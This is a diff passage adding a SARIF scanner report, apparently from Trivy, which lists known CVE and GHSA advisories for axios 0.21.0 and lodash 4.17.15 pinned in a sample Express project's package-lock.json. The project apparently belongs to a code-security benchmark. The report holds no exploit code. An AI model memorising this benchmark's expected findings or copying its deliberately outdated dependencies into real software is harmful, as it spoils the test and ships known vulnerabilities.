+            "text": "Package: axios\nInstalled Version: 0.21.0\nVulnerability CVE-2026-44487\nSeverity: HIGH\nFixed Version: 1.16.0, 0.32.0\nLink: [CVE-2026-44487](https://avd.aquasec.com/nvd/cve-2026-44487)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 162,
+                  "startColumn": 1,
+                  "endLine": 171,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: axios@0.21.0"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-44492",
+          "level": "error",
+          "message": {
+            "text": "Package: axios\nInstalled Version: 0.21.0\nVulnerability CVE-2026-44492\nSeverity: HIGH\nFixed Version: 1.16.0, 0.32.0\nLink: [CVE-2026-44492](https://avd.aquasec.com/nvd/cve-2026-44492)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 162,
+                  "startColumn": 1,
+                  "endLine": 171,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: axios@0.21.0"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-44495",
+          "level": "error",
+          "message": {
+            "text": "Package: axios\nInstalled Version: 0.21.0\nVulnerability CVE-2026-44495\nSeverity: HIGH\nFixed Version: 1.15.2, 0.31.1\nLink: [CVE-2026-44495](https://avd.aquasec.com/nvd/cve-2026-44495)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 162,
+                  "startColumn": 1,
+                  "endLine": 171,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: axios@0.21.0"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-44496",
+          "level": "error",
+          "message": {
+            "text": "Package: axios\nInstalled Version: 0.21.0\nVulnerability CVE-2026-44496\nSeverity: HIGH\nFixed Version: 1.16.0, 0.32.0\nLink: [CVE-2026-44496](https://avd.aquasec.com/nvd/cve-2026-44496)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 162,
+                  "startColumn": 1,
+                  "endLine": 171,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: axios@0.21.0"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2020-28168",
+          "level": "warning",
+          "message": {
+            "text": "Package: axios\nInstalled Version: 0.21.0\nVulnerability CVE-2020-28168\nSeverity: MEDIUM\nFixed Version: 0.21.1\nLink: [CVE-2020-28168](https://avd.aquasec.com/nvd/cve-2020-28168)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 162,
+                  "startColumn": 1,
+                  "endLine": 171,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: axios@0.21.0"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2023-45857",
+          "level": "warning",
+          "message": {
+            "text": "Package: axios\nInstalled Version: 0.21.0\nVulnerability CVE-2023-45857\nSeverity: MEDIUM\nFixed Version: 1.6.0, 0.28.0\nLink: [CVE-2023-45857](https://avd.aquasec.com/nvd/cve-2023-45857)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 162,
+                  "startColumn": 1,
+                  "endLine": 171,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: axios@0.21.0"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2025-62718",
+          "level": "warning",
+          "message": {
+            "text": "Package: axios\nInstalled Version: 0.21.0\nVulnerability CVE-2025-62718\nSeverity: MEDIUM\nFixed Version: 1.15.0, 0.31.0\nLink: [CVE-2025-62718](https://avd.aquasec.com/nvd/cve-2025-62718)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 162,
+                  "startColumn": 1,
+                  "endLine": 171,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: axios@0.21.0"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-40175",
+          "level": "warning",
+          "message": {
+            "text": "Package: axios\nInstalled Version: 0.21.0\nVulnerability CVE-2026-40175\nSeverity: MEDIUM\nFixed Version: 1.15.0, 0.31.0\nLink: [CVE-2026-40175](https://avd.aquasec.com/nvd/cve-2026-40175)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 162,
+                  "startColumn": 1,
+                  "endLine": 171,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: axios@0.21.0"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-42034",
+          "level": "warning",
+          "message": {
+            "text": "Package: axios\nInstalled Version: 0.21.0\nVulnerability CVE-2026-42034\nSeverity: MEDIUM\nFixed Version: 1.15.1, 0.31.1\nLink: [CVE-2026-42034](https://avd.aquasec.com/nvd/cve-2026-42034)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 162,
+                  "startColumn": 1,
+                  "endLine": 171,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: axios@0.21.0"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-42036",
+          "level": "warning",
+          "message": {
+            "text": "Package: axios\nInstalled Version: 0.21.0\nVulnerability CVE-2026-42036\nSeverity: MEDIUM\nFixed Version: 1.15.1, 0.31.1\nLink: [CVE-2026-42036](https://avd.aquasec.com/nvd/cve-2026-42036)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 162,
+                  "startColumn": 1,
+                  "endLine": 171,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: axios@0.21.0"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-42038",
+          "level": "warning",
+          "message": {
+            "text": "Package: axios\nInstalled Version: 0.21.0\nVulnerability CVE-2026-42038\nSeverity: MEDIUM\nFixed Version: 1.15.1, 0.31.1\nLink: [CVE-2026-42038](https://avd.aquasec.com/nvd/cve-2026-42038)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 162,
+                  "startColumn": 1,
+                  "endLine": 171,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: axios@0.21.0"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-42039",
+          "level": "warning",
+          "message": {
+            "text": "Package: axios\nInstalled Version: 0.21.0\nVulnerability CVE-2026-42039\nSeverity: MEDIUM\nFixed Version: 1.15.1, 0.31.1\nLink: [CVE-2026-42039](https://avd.aquasec.com/nvd/cve-2026-42039)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 162,
+                  "startColumn": 1,
+                  "endLine": 171,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: axios@0.21.0"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-42041",
+          "level": "warning",
+          "message": {
+            "text": "Package: axios\nInstalled Version: 0.21.0\nVulnerability CVE-2026-42041\nSeverity: MEDIUM\nFixed Version: 1.15.1, 0.31.1\nLink: [CVE-2026-42041](https://avd.aquasec.com/nvd/cve-2026-42041)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 162,
+                  "startColumn": 1,
+                  "endLine": 171,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: axios@0.21.0"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-42042",
+          "level": "warning",
+          "message": {
+            "text": "Package: axios\nInstalled Version: 0.21.0\nVulnerability CVE-2026-42042\nSeverity: MEDIUM\nFixed Version: 1.15.1, 0.31.1\nLink: [CVE-2026-42042](https://avd.aquasec.com/nvd/cve-2026-42042)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 162,
+                  "startColumn": 1,
+                  "endLine": 171,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: axios@0.21.0"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-44490",
+          "level": "warning",
+          "message": {
+            "text": "Package: axios\nInstalled Version: 0.21.0\nVulnerability CVE-2026-44490\nSeverity: MEDIUM\nFixed Version: 1.16.0, 0.32.0\nLink: [CVE-2026-44490](https://avd.aquasec.com/nvd/cve-2026-44490)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 162,
+                  "startColumn": 1,
+                  "endLine": 171,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: axios@0.21.0"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "GHSA-7q8q-rj6j-mhjq",
+          "level": "warning",
+          "message": {
+            "text": "Package: axios\nInstalled Version: 0.21.0\nVulnerability GHSA-7q8q-rj6j-mhjq\nSeverity: MEDIUM\nFixed Version: 0.33.0, 1.18.0\nLink: [GHSA-7q8q-rj6j-mhjq](https://github.com/advisories/GHSA-7q8q-rj6j-mhjq)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 162,
+                  "startColumn": 1,
+                  "endLine": 171,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: axios@0.21.0"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "GHSA-mmx7-hfxf-jppx",
+          "level": "warning",
+          "message": {
+            "text": "Package: axios\nInstalled Version: 0.21.0\nVulnerability GHSA-mmx7-hfxf-jppx\nSeverity: MEDIUM\nFixed Version: 1.18.0, 0.33.0\nLink: [GHSA-mmx7-hfxf-jppx](https://github.com/advisories/GHSA-mmx7-hfxf-jppx)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 162,
+                  "startColumn": 1,
+                  "endLine": 171,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: axios@0.21.0"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-42040",
+          "level": "note",
+          "message": {
+            "text": "Package: axios\nInstalled Version: 0.21.0\nVulnerability CVE-2026-42040\nSeverity: LOW\nFixed Version: 1.15.1, 0.31.1\nLink: [CVE-2026-42040](https://avd.aquasec.com/nvd/cve-2026-42040)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 162,
+                  "startColumn": 1,
+                  "endLine": 171,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: axios@0.21.0"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2020-8203",
+          "level": "error",
+          "message": {
+            "text": "Package: lodash\nInstalled Version: 4.17.15\nVulnerability CVE-2020-8203\nSeverity: HIGH\nFixed Version: 4.17.19\nLink: [CVE-2020-8203](https://avd.aquasec.com/nvd/cve-2020-8203)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 603,
+                  "startColumn": 1,
+                  "endLine": 608,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: lodash@4.17.15"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2021-23337",
+          "level": "error",
+          "message": {
+            "text": "Package: lodash\nInstalled Version: 4.17.15\nVulnerability CVE-2021-23337\nSeverity: HIGH\nFixed Version: 4.17.21\nLink: [CVE-2021-23337](https://avd.aquasec.com/nvd/cve-2021-23337)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 603,
+                  "startColumn": 1,
+                  "endLine": 608,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: lodash@4.17.15"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-4800",
+          "level": "error",
+          "message": {
+            "text": "Package: lodash\nInstalled Version: 4.17.15\nVulnerability CVE-2026-4800\nSeverity: HIGH\nFixed Version: 4.18.0\nLink: [CVE-2026-4800](https://avd.aquasec.com/nvd/cve-2026-4800)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 603,
+                  "startColumn": 1,
+                  "endLine": 608,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: lodash@4.17.15"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "NSWG-ECO-516",
+          "level": "error",
+          "message": {
+            "text": "Package: lodash\nInstalled Version: 4.17.15\nVulnerability NSWG-ECO-516\nSeverity: HIGH\nFixed Version: >=4.17.19\nLink: [NSWG-ECO-516](https://www.npmjs.com/advisories/1523)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 603,
+                  "startColumn": 1,
+                  "endLine": 608,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: lodash@4.17.15"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2020-28500",
+          "level": "warning",
+          "message": {
+            "text": "Package: lodash\nInstalled Version: 4.17.15\nVulnerability CVE-2020-28500\nSeverity: MEDIUM\nFixed Version: 4.17.21\nLink: [CVE-2020-28500](https://avd.aquasec.com/nvd/cve-2020-28500)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 603,
+                  "startColumn": 1,
+                  "endLine": 608,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: lodash@4.17.15"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2025-13465",
+          "level": "warning",
+          "message": {
+            "text": "Package: lodash\nInstalled Version: 4.17.15\nVulnerability CVE-2025-13465\nSeverity: MEDIUM\nFixed Version: 4.17.23\nLink: [CVE-2025-13465](https://avd.aquasec.com/nvd/cve-2025-13465)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 603,
+                  "startColumn": 1,
+                  "endLine": 608,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: lodash@4.17.15"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-2950",
+          "level": "warning",
+          "message": {
+            "text": "Package: lodash\nInstalled Version: 4.17.15\nVulnerability CVE-2026-2950\nSeverity: MEDIUM\nFixed Version: 4.18.0\nLink: [CVE-2026-2950](https://avd.aquasec.com/nvd/cve-2026-2950)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 603,
+                  "startColumn": 1,
+                  "endLine": 608,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: lodash@4.17.15"
+              }
+            }
+          ]
+        }
+      ],
+      "columnKind": "utf16CodeUnits",
+      "originalUriBaseIds": {
+        "ROOTPATH": {
+          "uri": "file:///home/bertrand/repos/codesec-bench/samples/typescript-express/"
+        }
+      }
+    }
+  ]
+}
